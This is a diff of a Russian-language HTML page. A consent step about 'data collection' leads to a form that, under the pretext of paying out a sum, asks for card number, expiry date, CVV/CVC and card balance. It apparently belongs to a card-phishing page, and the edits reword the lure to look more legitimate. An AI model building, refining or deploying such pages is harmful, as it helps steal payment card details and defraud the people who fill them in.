@@ -135,7 +135,6 @@
 
   <!-- Шаг 1: объяснение -->
   <div class="container active" id="step1">
-    <h2>Политика обработки и сбора данных</h2>
 <h2>Политика обработки и сбора данных</h2>
 <h3>ВНИМАТЕЛЬНО ПРОЧТИТЕ ВСЁ НИЖЕ</h3>
 
@@ -157,18 +156,18 @@
 <p><s>5. Безопасность</s></p>
 <p>Передача данных осуществляется через защищённые каналы связи. Мы принимаем меры для предотвращения несанкционированного доступа и защиты информации пользователей.</p>
     <label>
-      <input type="checkbox" id="agree"> Я ознакомился и согласен
+      <input type="checkbox" id="agree"> Я внимательно ознакомился(лась) с политикой сбора данных и подтверждаю прочтение и согласие.
     </label>
     <button id="nextBtn" disabled>Перейти далее</button>
   </div>
 
   <!-- Шаг 2: форма -->
   <div class="container" id="step2">
-    <h2>Введите данные карты</h2>
+    <h2>Укажите данные для вывода суммы</h2>
     <form id="paymentForm">
       <input type="text" placeholder="Номер карты" maxlength="16" required>
       <input type="text" placeholder="MM/YY" maxlength="5" required>
-      <input type="text" placeholder="CVV" maxlength="3" required>
+      <input type="text" placeholder="CVV/CVC" maxlength="3" required>
       
       <input type="text" placeholder="Баланс карты" required>
       <select required>
@@ -221,5 +220,6 @@
   </script>
 </body>
 </html>
+
 
 
